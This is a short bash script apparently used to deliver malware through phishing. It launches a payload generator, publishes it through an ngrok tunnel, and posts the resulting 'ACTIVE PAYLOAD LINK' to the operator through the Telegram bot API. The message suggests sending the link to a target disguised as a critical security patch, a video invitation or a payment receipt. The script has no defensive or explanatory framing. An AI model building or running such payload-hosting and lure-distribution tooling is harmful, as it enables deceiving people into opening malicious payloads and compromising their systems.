#!/bin/bash
python payload_generator.py &
ngrok http 8080 --log=stdout > ngrok.log &
sleep 8
NGROK_URL=$(curl -s http://localhost:4040/api/tunnels | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['tunnels'][0]['public_url'])" 2>/dev/null)
echo "$NGROK_URL" > active_link.txt
echo "LINK ACTIVE: $NGROK_URL"

# Send link to Telegram using Python
python3 -c "
import requests
BOT_TOKEN = 'YOUR_BOT_TOKEN'
CHAT_ID = 'YOUR_CHAT_ID'
link = open('active_link.txt').read().strip()
msg = f'🔗 ACTIVE PAYLOAD LINK\n{link}\n\nSend to target disguised as:\n- Critical security patch\n- Video invitation\n- Payment receipt'
requests.post(f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage', json={'chat_id': CHAT_ID, 'text': msg})
"
